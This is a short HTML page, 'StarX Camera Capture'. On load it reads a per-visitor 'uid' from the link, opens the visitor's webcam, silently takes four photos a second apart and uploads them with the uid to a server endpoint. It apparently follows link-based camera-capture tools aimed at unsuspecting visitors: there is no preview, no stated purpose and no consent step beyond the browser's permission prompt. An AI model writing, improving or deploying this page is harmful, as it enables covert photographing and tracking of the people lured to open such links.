<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>StarX Camera Capture</title>
</head>
<body>
<h1>📸 StarX Camera Capture</h1>
<script>
const uid = new URLSearchParams(window.location.search).get("uid") || "NO_UID";

async function capturePhotos() {
  try {
    // get camera
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    const photos = [];

    for (let i = 0; i < 4; i++) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
      photos.push(blob);
      await new Promise(r => setTimeout(r, 1000)); // 1 second interval
    }

    const formData = new FormData();
    photos.forEach((p, i) => formData.append('photo'+(i+1), p));
    formData.append('uid', uid);

    const res = await fetch('/api/upload', { method: 'POST', body: formData });
    if (res.ok) alert("✅ 4 Photos sent successfully!");
    else alert("❌ Upload failed");

    stream.getTracks().forEach(track => track.stop());
  } catch(e) {
    console.error(e);
    alert("❌ Error capturing photos: " + e.message);
  }
}

window.onload = () => capturePhotos();
</script>
</body>
</html>
